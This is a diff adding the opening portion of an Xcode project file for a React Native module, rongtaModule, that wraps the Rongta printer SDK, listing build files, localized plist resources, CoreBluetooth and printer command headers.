@@ -1,0 +1,1390 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 46;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		00E356F31AD99517003FC87E /* rongtaModuleTests.m in Sources */ = {isa = PBXBuildFile; fileRef = 00E356F21AD99517003FC87E /* rongtaModuleTests.m */; };
+		0201B8F05E5F7BFAD45C336D /* libPods-rongtaModule-rongtaModuleTests.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 040789654F251257DCF1BF72 /* libPods-rongtaModule-rongtaModuleTests.a */; };
+		13B07FBC1A68108700A75B9A /* AppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 13B07FB01A68108700A75B9A /* AppDelegate.m */; };
+		13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB51A68108700A75B9A /* Images.xcassets */; };
+		13B07FC11A68108700A75B9A /* main.m in Sources */ = {isa = PBXBuildFile; fileRef = 13B07FB71A68108700A75B9A /* main.m */; };
+		150C341325F1D6B9009AC817 /* port_type.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C33EC25F1D6B9009AC817 /* port_type.plist */; };
+		150C341425F1D6B9009AC817 /* port_type.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C33EC25F1D6B9009AC817 /* port_type.plist */; };
+		150C341525F1D6B9009AC817 /* label_direct.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C33EE25F1D6B9009AC817 /* label_direct.plist */; };
+		150C341625F1D6B9009AC817 /* label_direct.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C33EE25F1D6B9009AC817 /* label_direct.plist */; };
+		150C341725F1D6B9009AC817 /* font_attrib.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C33F025F1D6B9009AC817 /* font_attrib.plist */; };
+		150C341825F1D6B9009AC817 /* font_attrib.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C33F025F1D6B9009AC817 /* font_attrib.plist */; };
+		150C341925F1D6B9009AC817 /* cut_mode.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C33F225F1D6B9009AC817 /* cut_mode.plist */; };
+		150C341A25F1D6B9009AC817 /* cut_mode.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C33F225F1D6B9009AC817 /* cut_mode.plist */; };
+		150C341B25F1D6B9009AC817 /* template.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C33F425F1D6B9009AC817 /* template.plist */; };
+		150C341C25F1D6B9009AC817 /* template.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C33F425F1D6B9009AC817 /* template.plist */; };
+		150C341D25F1D6B9009AC817 /* print_color.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C33F625F1D6B9009AC817 /* print_color.plist */; };
+		150C341E25F1D6B9009AC817 /* print_color.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C33F625F1D6B9009AC817 /* print_color.plist */; };
+		150C341F25F1D6B9009AC817 /* label_speed.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C33FE25F1D6B9009AC817 /* label_speed.plist */; };
+		150C342025F1D6B9009AC817 /* label_speed.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C33FE25F1D6B9009AC817 /* label_speed.plist */; };
+		150C342125F1D6B9009AC817 /* text_encoding.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C33FF25F1D6B9009AC817 /* text_encoding.plist */; };
+		150C342225F1D6B9009AC817 /* text_encoding.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C33FF25F1D6B9009AC817 /* text_encoding.plist */; };
+		150C342325F1D6B9009AC817 /* font_attrib_icon.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340025F1D6B9009AC817 /* font_attrib_icon.plist */; };
+		150C342425F1D6B9009AC817 /* font_attrib_icon.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340025F1D6B9009AC817 /* font_attrib_icon.plist */; };
+		150C342525F1D6B9009AC817 /* barcode_type.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340725F1D6B9009AC817 /* barcode_type.plist */; };
+		150C342625F1D6B9009AC817 /* barcode_type.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340725F1D6B9009AC817 /* barcode_type.plist */; };
+		150C342725F1D6B9009AC817 /* label_space.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340825F1D6B9009AC817 /* label_space.plist */; };
+		150C342825F1D6B9009AC817 /* label_space.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340825F1D6B9009AC817 /* label_space.plist */; };
+		150C342925F1D6B9009AC817 /* label_size_dc.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340925F1D6B9009AC817 /* label_size_dc.plist */; };
+		150C342A25F1D6B9009AC817 /* label_size_dc.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340925F1D6B9009AC817 /* label_size_dc.plist */; };
+		150C342B25F1D6B9009AC817 /* font_size.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340A25F1D6B9009AC817 /* font_size.plist */; };
+		150C342C25F1D6B9009AC817 /* font_size.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340A25F1D6B9009AC817 /* font_size.plist */; };
+		150C342D25F1D6B9009AC817 /* label_cmd_set.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340B25F1D6B9009AC817 /* label_cmd_set.plist */; };
+		150C342E25F1D6B9009AC817 /* label_cmd_set.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340B25F1D6B9009AC817 /* label_cmd_set.plist */; };
+		150C342F25F1D6B9009AC817 /* ble_writetype.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340C25F1D6B9009AC817 /* ble_writetype.plist */; };
+		150C343025F1D6B9009AC817 /* ble_writetype.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340C25F1D6B9009AC817 /* ble_writetype.plist */; };
+		150C343125F1D6B9009AC817 /* instruction.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340D25F1D6B9009AC817 /* instruction.plist */; };
+		150C343225F1D6B9009AC817 /* instruction.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340D25F1D6B9009AC817 /* instruction.plist */; };
+		150C343325F1D6B9009AC817 /* nvbitmap.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340E25F1D6B9009AC817 /* nvbitmap.plist */; };
+		150C343425F1D6B9009AC817 /* nvbitmap.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340E25F1D6B9009AC817 /* nvbitmap.plist */; };
+		150C343525F1D6B9009AC817 /* label_size.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340F25F1D6B9009AC817 /* label_size.plist */; };
+		150C343625F1D6B9009AC817 /* label_size.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C340F25F1D6B9009AC817 /* label_size.plist */; };
+		150C343725F1D6B9009AC817 /* ble_serial.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C341025F1D6B9009AC817 /* ble_serial.plist */; };
+		150C343825F1D6B9009AC817 /* ble_serial.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C341025F1D6B9009AC817 /* ble_serial.plist */; };
+		150C343925F1D6B9009AC817 /* codepage.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C341125F1D6B9009AC817 /* codepage.plist */; };
+		150C343A25F1D6B9009AC817 /* codepage.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C341125F1D6B9009AC817 /* codepage.plist */; };
+		150C343B25F1D6B9009AC817 /* label_chroma.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C341225F1D6B9009AC817 /* label_chroma.plist */; };
+		150C343C25F1D6B9009AC817 /* label_chroma.plist in Resources */ = {isa = PBXBuildFile; fileRef = 150C341225F1D6B9009AC817 /* label_chroma.plist */; };
+		15D7F14725EA03D40079BA11 /* CoreBluetooth.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 15D7F14625EA03D40079BA11 /* CoreBluetooth.framework */; };
+		261E7E5B3221CA0DD96FECAD /* libPods-rongtaModule.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 273BFC6C069C64A5F85596FA /* libPods-rongtaModule.a */; };
+		2D02E4BC1E0B4A80006451C7 /* AppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 13B07FB01A68108700A75B9A /* AppDelegate.m */; };
+		2D02E4BD1E0B4A84006451C7 /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB51A68108700A75B9A /* Images.xcassets */; };
+		2D02E4BF1E0B4AB3006451C7 /* main.m in Sources */ = {isa = PBXBuildFile; fileRef = 13B07FB71A68108700A75B9A /* main.m */; };
+		2DCD954D1E0B4F2C00145EB5 /* rongtaModuleTests.m in Sources */ = {isa = PBXBuildFile; fileRef = 00E356F21AD99517003FC87E /* rongtaModuleTests.m */; };
+		81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */; };
+		82AA7FCFA530F1D078B0936F /* libPods-rongtaModule-tvOS.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 098BC2A30F282F082A2E68FF /* libPods-rongtaModule-tvOS.a */; };
+		B15E917825EABFF8004670A4 /* PrinterManager.m in Sources */ = {isa = PBXBuildFile; fileRef = B15E917725EABFF8004670A4 /* PrinterManager.m */; };
+		B15E917925EABFF8004670A4 /* PrinterManager.m in Sources */ = {isa = PBXBuildFile; fileRef = B15E917725EABFF8004670A4 /* PrinterManager.m */; };
+		B187477D25E5624B005BF549 /* RNRongta.m in Sources */ = {isa = PBXBuildFile; fileRef = B187477C25E5624B005BF549 /* RNRongta.m */; };
+		B187477E25E5624B005BF549 /* RNRongta.m in Sources */ = {isa = PBXBuildFile; fileRef = B187477C25E5624B005BF549 /* RNRongta.m */; };
+		B187485325E6B327005BF549 /* Settings.bundle in Resources */ = {isa = PBXBuildFile; fileRef = B187485225E6B327005BF549 /* Settings.bundle */; };
+		B187485425E6B327005BF549 /* Settings.bundle in Resources */ = {isa = PBXBuildFile; fileRef = B187485225E6B327005BF549 /* Settings.bundle */; };
+		B187486625E6BD62005BF549 /* Sdk in Resources */ = {isa = PBXBuildFile; fileRef = B187486425E6BD62005BF549 /* Sdk */; };
+		B187488325E6C1EE005BF549 /* libRTPrinterSDK.a in Frameworks */ = {isa = PBXBuildFile; fileRef = B187488225E6C1EE005BF549 /* libRTPrinterSDK.a */; };
+		B187488425E6C1EE005BF549 /* libRTPrinterSDK.a in Frameworks */ = {isa = PBXBuildFile; fileRef = B187488225E6C1EE005BF549 /* libRTPrinterSDK.a */; };
+		B57ED49B81D4E69B6C1992FA /* libPods-rongtaModule-tvOSTests.a in Frameworks */ = {isa = PBXBuildFile; fileRef = F6C6552703662B82177D4B8B /* libPods-rongtaModule-tvOSTests.a */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		00E356F41AD99517003FC87E /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 83CBB9F71A601CBA00E9B192 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 13B07F861A680F5B00A75B9A;
+			remoteInfo = rongtaModule;
+		};
+		2D02E4911E0B4A5D006451C7 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 83CBB9F71A601CBA00E9B192 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 2D02E47A1E0B4A5D006451C7;
+			remoteInfo = "rongtaModule-tvOS";
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXFileReference section */
+		00E356EE1AD99517003FC87E /* rongtaModuleTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = rongtaModuleTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
+		00E356F11AD99517003FC87E /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		00E356F21AD99517003FC87E /* rongtaModuleTests.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = rongtaModuleTests.m; sourceTree = "<group>"; };
+		040789654F251257DCF1BF72 /* libPods-rongtaModule-rongtaModuleTests.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-rongtaModule-rongtaModuleTests.a"; sourceTree = BUILT_PRODUCTS_DIR; };
+		098BC2A30F282F082A2E68FF /* libPods-rongtaModule-tvOS.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-rongtaModule-tvOS.a"; sourceTree = BUILT_PRODUCTS_DIR; };
+		13B07F961A680F5B00A75B9A /* rongtaModule.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = rongtaModule.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		13B07FAF1A68108700A75B9A /* AppDelegate.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = AppDelegate.h; path = rongtaModule/AppDelegate.h; sourceTree = "<group>"; };
+		13B07FB01A68108700A75B9A /* AppDelegate.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = AppDelegate.m; path = rongtaModule/AppDelegate.m; sourceTree = "<group>"; };
+		13B07FB51A68108700A75B9A /* Images.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; name = Images.xcassets; path = rongtaModule/Images.xcassets; sourceTree = "<group>"; };
+		13B07FB61A68108700A75B9A /* Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; name = Info.plist; path = rongtaModule/Info.plist; sourceTree = "<group>"; };
+		13B07FB71A68108700A75B9A /* main.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = main.m; path = rongtaModule/main.m; sourceTree = "<group>"; };
+		150C33ED25F1D6B9009AC817 /* zh-Hans */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = "zh-Hans"; path = "zh-Hans.lproj/port_type.plist"; sourceTree = "<group>"; };
+		150C33EF25F1D6B9009AC817 /* zh-Hans */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = "zh-Hans"; path = "zh-Hans.lproj/label_direct.plist"; sourceTree = "<group>"; };
+		150C33F125F1D6B9009AC817 /* zh-Hans */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = "zh-Hans"; path = "zh-Hans.lproj/font_attrib.plist"; sourceTree = "<group>"; };
+		150C33F325F1D6B9009AC817 /* zh-Hans */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = "zh-Hans"; path = "zh-Hans.lproj/cut_mode.plist"; sourceTree = "<group>"; };
+		150C33F525F1D6B9009AC817 /* zh-Hans */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = "zh-Hans"; path = "zh-Hans.lproj/template.plist"; sourceTree = "<group>"; };
+		150C33F725F1D6B9009AC817 /* zh-Hans */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = "zh-Hans"; path = "zh-Hans.lproj/print_color.plist"; sourceTree = "<group>"; };
+		150C33F825F1D6B9009AC817 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = en; path = en.lproj/port_type.plist; sourceTree = "<group>"; };
+		150C33F925F1D6B9009AC817 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = en; path = en.lproj/label_direct.plist; sourceTree = "<group>"; };
+		150C33FA25F1D6B9009AC817 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = en; path = en.lproj/font_attrib.plist; sourceTree = "<group>"; };
+		150C33FB25F1D6B9009AC817 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = en; path = en.lproj/cut_mode.plist; sourceTree = "<group>"; };
+		150C33FC25F1D6B9009AC817 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = en; path = en.lproj/template.plist; sourceTree = "<group>"; };
+		150C33FD25F1D6B9009AC817 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = en; path = en.lproj/print_color.plist; sourceTree = "<group>"; };
+		150C33FE25F1D6B9009AC817 /* label_speed.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = label_speed.plist; sourceTree = "<group>"; };
+		150C33FF25F1D6B9009AC817 /* text_encoding.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = text_encoding.plist; sourceTree = "<group>"; };
+		150C340025F1D6B9009AC817 /* font_attrib_icon.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = font_attrib_icon.plist; sourceTree = "<group>"; };
+		150C340125F1D6B9009AC817 /* zh-Hant */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = "zh-Hant"; path = "zh-Hant.lproj/port_type.plist"; sourceTree = "<group>"; };
+		150C340225F1D6B9009AC817 /* zh-Hant */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = "zh-Hant"; path = "zh-Hant.lproj/label_direct.plist"; sourceTree = "<group>"; };
+		150C340325F1D6B9009AC817 /* zh-Hant */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = "zh-Hant"; path = "zh-Hant.lproj/font_attrib.plist"; sourceTree = "<group>"; };
+		150C340425F1D6B9009AC817 /* zh-Hant */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = "zh-Hant"; path = "zh-Hant.lproj/cut_mode.plist"; sourceTree = "<group>"; };
+		150C340525F1D6B9009AC817 /* zh-Hant */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = "zh-Hant"; path = "zh-Hant.lproj/template.plist"; sourceTree = "<group>"; };
+		150C340625F1D6B9009AC817 /* zh-Hant */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = "zh-Hant"; path = "zh-Hant.lproj/print_color.plist"; sourceTree = "<group>"; };
+		150C340725F1D6B9009AC817 /* barcode_type.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = barcode_type.plist; sourceTree = "<group>"; };
+		150C340825F1D6B9009AC817 /* label_space.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = label_space.plist; sourceTree = "<group>"; };
+		150C340925F1D6B9009AC817 /* label_size_dc.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = label_size_dc.plist; sourceTree = "<group>"; };
+		150C340A25F1D6B9009AC817 /* font_size.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = font_size.plist; sourceTree = "<group>"; };
+		150C340B25F1D6B9009AC817 /* label_cmd_set.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = label_cmd_set.plist; sourceTree = "<group>"; };
+		150C340C25F1D6B9009AC817 /* ble_writetype.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = ble_writetype.plist; sourceTree = "<group>"; };
+		150C340D25F1D6B9009AC817 /* instruction.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = instruction.plist; sourceTree = "<group>"; };
+		150C340E25F1D6B9009AC817 /* nvbitmap.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = nvbitmap.plist; sourceTree = "<group>"; };
+		150C340F25F1D6B9009AC817 /* label_size.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = label_size.plist; sourceTree = "<group>"; };
+		150C341025F1D6B9009AC817 /* ble_serial.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = ble_serial.plist; sourceTree = "<group>"; };
+		150C341125F1D6B9009AC817 /* codepage.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = codepage.plist; sourceTree = "<group>"; };
+		150C341225F1D6B9009AC817 /* label_chroma.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = label_chroma.plist; sourceTree = "<group>"; };
+		15D7F14625EA03D40079BA11 /* CoreBluetooth.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = CoreBluetooth.framework; path = System/Library/Frameworks/CoreBluetooth.framework; sourceTree = SDKROOT; };
+		15DDDCAA25F1D75D006E4EF4 /* PlistUtils.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = PlistUtils.h; sourceTree = "<group>"; };
+		1A5BE9D9983BA06A4265F68F /* Pods-rongtaModule.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-rongtaModule.debug.xcconfig"; path = "Target Support Files/Pods-rongtaModule/Pods-rongtaModule.debug.xcconfig"; sourceTree = "<group>"; };
+		273BFC6C069C64A5F85596FA /* libPods-rongtaModule.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-rongtaModule.a"; sourceTree = BUILT_PRODUCTS_DIR; };
+		2D02E47B1E0B4A5D006451C7 /* rongtaModule-tvOS.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "rongtaModule-tvOS.app"; sourceTree = BUILT_PRODUCTS_DIR; };
+		2D02E4901E0B4A5D006451C7 /* rongtaModule-tvOSTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "rongtaModule-tvOSTests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
+		3625E43FD0FA3692B8404432 /* Pods-rongtaModule-rongtaModuleTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-rongtaModule-rongtaModuleTests.debug.xcconfig"; path = "Target Support Files/Pods-rongtaModule-rongtaModuleTests/Pods-rongtaModule-rongtaModuleTests.debug.xcconfig"; sourceTree = "<group>"; };
+		3CCDBB4B95A014B7E239441B /* Pods-rongtaModule-tvOSTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-rongtaModule-tvOSTests.debug.xcconfig"; path = "Target Support Files/Pods-rongtaModule-tvOSTests/Pods-rongtaModule-tvOSTests.debug.xcconfig"; sourceTree = "<group>"; };
+		50D173938BCC7B7EBF075A6E /* Pods-rongtaModule-tvOSTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-rongtaModule-tvOSTests.release.xcconfig"; path = "Target Support Files/Pods-rongtaModule-tvOSTests/Pods-rongtaModule-tvOSTests.release.xcconfig"; sourceTree = "<group>"; };
+		52A5B54B95911B6F21974079 /* Pods-rongtaModule.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-rongtaModule.release.xcconfig"; path = "Target Support Files/Pods-rongtaModule/Pods-rongtaModule.release.xcconfig"; sourceTree = "<group>"; };
+		65A7543C2741765C4DBD13B4 /* Pods-rongtaModule-rongtaModuleTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-rongtaModule-rongtaModuleTests.release.xcconfig"; path = "Target Support Files/Pods-rongtaModule-rongtaModuleTests/Pods-rongtaModule-rongtaModuleTests.release.xcconfig"; sourceTree = "<group>"; };
+		81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; name = LaunchScreen.storyboard; path = rongtaModule/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		A47FED5D018BEE58D37637D9 /* Pods-rongtaModule-tvOS.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-rongtaModule-tvOS.release.xcconfig"; path = "Target Support Files/Pods-rongtaModule-tvOS/Pods-rongtaModule-tvOS.release.xcconfig"; sourceTree = "<group>"; };
+		B15E917625EABFF8004670A4 /* PrinterManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = PrinterManager.h; sourceTree = "<group>"; };
+		B15E917725EABFF8004670A4 /* PrinterManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = PrinterManager.m; sourceTree = "<group>"; };
+		B187477B25E5624B005BF549 /* RNRongta.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = RNRongta.h; sourceTree = "<group>"; };
+		B187477C25E5624B005BF549 /* RNRongta.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = RNRongta.m; sourceTree = "<group>"; };
+		B18747B225E67A22005BF549 /* libRTPrinterSDK.a */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; path = libRTPrinterSDK.a; sourceTree = "<group>"; };
+		B18747B525E67A22005BF549 /* ZPLFactory.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ZPLFactory.h; sourceTree = "<group>"; };
+		B18747B625E67A22005BF549 /* NetworkPrinter.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = NetworkPrinter.h; sourceTree = "<group>"; };
+		B18747B725E67A22005BF549 /* ThermalPrinter.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ThermalPrinter.h; sourceTree = "<group>"; };
+		B18747B825E67A22005BF549 /* Printer.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = Printer.h; sourceTree = "<group>"; };
+		B18747B925E67A22005BF549 /* CPCLCmd.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = CPCLCmd.h; sourceTree = "<group>"; };
+		B18747BA25E67A22005BF549 /* PinCmdFactory.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PinCmdFactory.h; sourceTree = "<group>"; };
+		B18747BB25E67A22005BF549 /* CmdFactory.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = CmdFactory.h; sourceTree = "<group>"; };
+		B18747BC25E67A22005BF549 /* Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = Header.h; sourceTree = "<group>"; };
+		B18747BD25E67A22005BF549 /* TextSetting.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = TextSetting.h; sourceTree = "<group>"; };
+		B18747BE25E67A22005BF549 /* ZPLCmd.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ZPLCmd.h; sourceTree = "<group>"; };
+		B18747BF25E67A22005BF549 /* EnumTypeDef.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = EnumTypeDef.h; sourceTree = "<group>"; };
+		B18747C025E67A22005BF549 /* PrinterStatusObj.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PrinterStatusObj.h; sourceTree = "<group>"; };
+		B18747C125E67A22005BF549 /* BarcodeSetting.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = BarcodeSetting.h; sourceTree = "<group>"; };
+		B18747C225E67A22005BF549 /* WifiInterface.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = WifiInterface.h; sourceTree = "<group>"; };
+		B18747C325E67A22005BF549 /* WIFIFactory.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = WIFIFactory.h; sourceTree = "<group>"; };
+		B18747C425E67A22005BF549 /* ESCCmd.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ESCCmd.h; sourceTree = "<group>"; };
+		B18747C525E67A22005BF549 /* RTBlueToothPI.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = RTBlueToothPI.h; sourceTree = "<group>"; };
+		B18747C625E67A22005BF549 /* PinPrinter.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PinPrinter.h; sourceTree = "<group>"; };
+		B18747C725E67A22005BF549 /* SafeMutableArray.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = SafeMutableArray.h; sourceTree = "<group>"; };
+		B18747C825E67A22005BF549 /* PIFactory.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PIFactory.h; sourceTree = "<group>"; };
+		B18747C925E67A22005BF549 /* ObserverObj.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ObserverObj.h; sourceTree = "<group>"; };
+		B18747CA25E67A22005BF549 /* ESCFactory.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ESCFactory.h; sourceTree = "<group>"; };
+		B18747CB25E67A22005BF549 /* LabelCommonSetting.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = LabelCommonSetting.h; sourceTree = "<group>"; };
+		B18747CC25E67A22005BF549 /* TSCCmd.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = TSCCmd.h; sourceTree = "<group>"; };
+		B18747CD25E67A22005BF549 /* BitmapSetting.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = BitmapSetting.h; sourceTree = "<group>"; };
+		B18747CE25E67A22005BF549 /* PinCmd.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PinCmd.h; sourceTree = "<group>"; };
